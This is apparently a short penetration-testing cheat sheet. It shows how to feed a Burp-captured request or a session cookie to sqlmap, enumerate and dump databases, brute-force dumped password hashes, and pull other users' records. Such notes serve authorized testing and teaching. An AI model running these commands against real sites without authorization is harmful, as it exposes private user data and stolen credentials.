## SQLmap

For this attack you should capture the request of an input parameter with burp. For this, you just have to intercept the request (login for example) and then just copy the request and save it in a txt file and run sqlmap with:

````
sqlmap -r <burpsuite txt file> --dbs
````


````
sqlmap -r <txt file from burpsuite> -D <database name> --tables
````

````
sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns
````

````
sqlmap -r <txt file from burpsuite> -D <database name> --dump
````

````
sqlmap -r <txt file from burpsuite> -D <database name> --tables -T users
````

**Dump All**

if you use for example:

````
sqlmap -r <burpsuite txt file> -D <ddbb> -T <table> --dump-all
````
And the case is if the table is the users table, with dump all sqlmap will ask to bruteforce the hashes, should be YES.


--------------------------------
**Lateral Movement**

On a website attack, you can use your session cookie (if you have an account) to extract information of another user from the table with sqlmap.

````
$ sqlmap -u "URL" --cookie="captured cookie of looged in user" --dbs    #for Database
````

````
$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* --tables #for Tables of selected Database
````

````
$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --colmns #for Column names
````

````
$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump #dump tables
````
-----------------------------------

